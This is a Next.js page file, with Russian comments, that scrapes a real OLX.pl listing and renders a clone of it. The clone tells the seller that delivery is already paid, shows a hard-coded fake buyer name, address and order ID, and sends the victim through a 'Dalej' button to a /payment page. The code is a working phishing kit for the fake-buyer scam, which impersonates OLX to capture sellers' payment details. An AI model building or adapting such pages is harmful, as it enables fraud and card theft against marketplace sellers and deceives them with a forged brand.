// app/[slug]/page.tsx
import * as cheerio from "cheerio";
import Link from "next/link";
import "../styles/ad-page.css";


type ProductData = {
  title: string;
  image: string;
  price?: string;
  description?: string;
  dateAdded?: string;
  params?: { label: string; value: string }[];
};

const orderInfo = {
  buyerName: "Marcin Bukowski",
  addressLine: "Lubelska 19/1 (m.12)",
  city: "Olsztyn 10-602",
  orderNote:
    "Jak tylko otrzymasz środki na swoją konto, wyślij towar do kupującego według danych, jakie napisane niżej. Po wysłaniu towaru prosimy o podanie kupującemu numeru dostawy.",
  orderId: "877692",
};

type PageProps = {
  // в новом Next params приходит как Promise
  params: Promise<{ slug: string }>;
};

// убираем .html из конца, если есть
function normalizeSlug(raw: string) {
  return raw.replace(/\.html$/i, "");
}

// генерируем название из slug (как ты просил)
function slugToTitle(slug: string) {
  // убираем .html, если вдруг есть
  let clean = slug.replace(/\.html$/i, "");

  // убираем всё после -CID (код категории и ID)
  clean = clean.replace(/-CID.*/i, "");

  // заменяем тире на пробелы
  clean = clean.replace(/-/g, " ");

  // делаем первую букву каждого слова заглавной
  clean = clean.replace(/\b\w/g, (c) => c.toUpperCase());

  return clean.trim();
}

// тут мы тянем страницу с OLX и парсим из неё данные
async function fetchProductFromOlx(
  rawSlug: string,
): Promise<ProductData | null> {
  const slug = normalizeSlug(rawSlug);
  const olxUrl = `https://www.olx.pl/d/oferta/${slug}.html`;

  console.log("[OLX] fetch:", olxUrl);

  try {
    const res = await fetch(olxUrl, {
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36",
      },
      next: { revalidate: 3600 }, // кэшируем на час
    });

    if (!res.ok) {
      console.error("[OLX] HTTP error:", res.status);
      return null;
    }

    const html = await res.text();
    const $ = cheerio.load(html);

    /* ---------- TITLE ---------- */
    // Берём название ИЗ ССЫЛКИ, как ты хотел
    const title = slugToTitle(slug);

    /* ---------- IMAGE ---------- */
    const image =
      $('meta[property="og:image"]').attr("content")?.trim() || "";

    /* ---------- PRICE ---------- */

    let price: string | undefined;

    const priceMeta = $('meta[property="product:price:amount"]')
      .attr("content")
      ?.trim();

    if (priceMeta) {
      const num = Number(priceMeta);
      if (!Number.isNaN(num)) {
        price = new Intl.NumberFormat("pl-PL").format(num) + " zł";
      } else {
        price = priceMeta + " zł";
      }
    } else {
      const rawPrice = $('[data-testid="ad-price-container"] h3')
        .first()
        .text()
        .trim();

      if (rawPrice) {
        price = rawPrice.replace(/\s+/g, " ");
      }
    }

    /* ---------- DESCRIPTION ---------- */

    let description = "";

    // корневой блок описания
    const descRoot = $('[data-cy="ad_description"]');

    if (descRoot.length) {
      const parts: string[] = [];

      // собираем текст из p, li, div, span внутри описания
      descRoot.find("p, li, div, span").each((_, el) => {
        const text = $(el).text().trim();
        if (text) parts.push(text);
      });

      description = parts.join("\n\n");

      // если вдруг так ничего не нашли — fallback на весь текст блока
      if (!description) {
        description = descRoot.text().replace(/\s{2,}/g, " ").trim();
      }
    }

    /* ---------- DATE ADDED ---------- */

    const dateAdded =
      $('[data-testid="ad-posted-at"]').text().trim() || "";

    /* ---------- PARAMS (характеристики) ---------- */

    const params: { label: string; value: string }[] = [];

    $('[data-testid="params-list"] li').each((_, el) => {
      const label = $(el).find("p").first().text().trim();
      const value = $(el).find("p").last().text().trim();

      if (label && value && label !== value) {
        params.push({ label, value });
      }
    });

    if (!title && !image) {
      console.error("[OLX] no title & image found");
      return null;
    }

    return { title, image, price, description, dateAdded, params };
  } catch (err) {
    console.error("[OLX] error:", err);
    return null;
  }
}

export default async function ProductPage({ params }: PageProps) {
  const { slug } = await params;

  const product = await fetchProductFromOlx(slug);

  if (!product) {
    return (
      <div className="olx-content">
        <p>Не удалось загрузить объявление. Проверь логи в консоли сервера.</p>
      </div>
    );
  }

  return (
    <div className="olx-content">
      {/* Хлебные крошки */}
      <div className="olx-breadcrumbs">
        <span>Motoryzacja &gt; Osobowe &gt; Audi</span>
        <span className="olx-breadcrumbs-current"> &gt; {product.title}</span>
      </div>

      {/* Основной блок в две колонки */}
      <div className="olx-main">
        {/* Левая колонка */}
        <div>
          {/* Галерея */}
          <div className="olx-gallery">
            <div className="olx-gallery-main">
              {product.image ? (
                <img src={product.image} alt={product.title} />
              ) : (
                <div className="olx-map-placeholder">Brak zdjęcia</div>
              )}
            </div>
          </div>

          {/* Блок как на скрине (доставка + описание заказа) */}
          <section className="olx-section olx-order-section">
            {/* Верхняя часть – доставка оплачена */}
            <div className="olx-order-paid">
              <h3 className="olx-order-paid-title">
                DOSTAWA ZOSTAŁA JUŻ OPŁACONA!
              </h3>

              <div className="olx-order-paid-row">
                <div className="olx-order-icon">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    viewBox="0 0 24 24"
                    aria-hidden="true"
                  >
                    <path
                      fill="currentColor"
                      d="M3 4h18v2H3V4zm0 4h18v2H3V8zm0 4h12v2H3v-2zm0 4h12v2H3v-2zM18 12l4 4-4 4v-3h-4v-2h4v-3z"
                    />
                  </svg>
                </div>

                <div className="olx-order-paid-info">
                  {/* Цена синхронна с карточкой справа */}
                  <div className="olx-order-price">
                    {product.price }
                  </div>
                  <div className="olx-order-safe">
                    Dokonywanie płatności jest bezpieczne
                  </div>
                </div>
              </div>

              <Link href="/payment" className="olx-delivery-btn">
                Dalej
              </Link>
            </div>

            <div className="olx-order-divider" />

            {/* Нижняя часть – текст и данные заказа */}
            <div className="olx-order-description">
              <h3 className="olx-order-opis-title">OPIS</h3>

              <p className="olx-order-text">{product.description}</p>

              <p className="olx-order-text">
                <span className="olx-order-label">Produkt</span>
                {" – "}
                {product.title}
              </p>

              <p className="olx-order-text">
                <span className="olx-order-label">Cena</span>
                {" – "}
                {product.price}
              </p>

              <p className="olx-order-text">
                <span className="olx-order-label">
                  Imię i nazwisko kupującego!
                </span>
                {" – "}
                {orderInfo.buyerName}
              </p>

              <p className="olx-order-text">
                <span className="olx-order-label">Adres dostawy</span>
                {" – "}
                {orderInfo.addressLine}, {orderInfo.city}
              </p>

              <p className="olx-order-text">
                <span className="olx-order-label">ID</span>
                {" – "}
                {orderInfo.orderId}
              </p>
            </div>
          </section>

          {/* Дата добавления + ID объявления (из slug) */}
          {product.dateAdded && (
            <p className="olx-added">Dodane {product.dateAdded}</p>
          )}

          <span className="olx-ad-id">
            ID ogłoszenia:&nbsp;
            {slug.split("ID").pop()?.replace(/\.html$/i, "")}
          </span>

          {/* Параметры */}
          {product.params && product.params.length > 0 && (
            <section className="olx-section">
              <h2>Parametry</h2>
              <div className="olx-params-grid">
                {product.params.map((p, i) => (
                  <div className="olx-param-item" key={i}>
                    <span className="olx-param-label">{p.label}</span>
                    <span className="olx-param-value">{p.value}</span>
                  </div>
                ))}
              </div>
            </section>
          )}
        </div>

        {/* Правая колонка */}
        <aside className="olx-main-right">
          <div className="olx-price-card">
            {/* Дата добавления */}
            {product.dateAdded && (
              <p className="olx-date-small">Dodane {product.dateAdded}</p>
            )}

            {/* Название объявления */}
            <h2 className="olx-title-price">{product.title}</h2>

            {/* Цена */}
            <div className="olx-price-row-new">
              <span className="olx-price-new">
                {product.price || "Cena na OLX"}
              </span>
              <span className="olx-price-negotiation">Do negocjacji</span>
            </div>

            {/* Иконка избранного */}
            <button className="olx-fav-btn-new">♡</button>

            {/* Кнопки действия */}
            <button className="olx-btn-main">Wyślij wiadomość</button>
            <button className="olx-btn-outline-new">Zadzwoń</button>

            {/* Источник */}
            <p className="olx-source-small">Źródło: OLX.pl</p>
          </div>

          {/* Продавец (пока фейковые данные) */}
          <div className="olx-box">
            <div className="olx-seller-box">
              <div className="olx-seller-avatar">
                {product.title.charAt(0).toUpperCase()}
              </div>
              <div className="olx-seller-info">
                <p className="olx-seller-name">Sprzedający</p>
                <p className="olx-seller-meta">Użytkownik OLX</p>
              </div>
            </div>
            <button className="olx-btn-outline" style={{ marginTop: 12 }}>
              Zobacz wszystkie ogłoszenia
            </button>
          </div>
        </aside>
      </div>
    </div>
  );
}
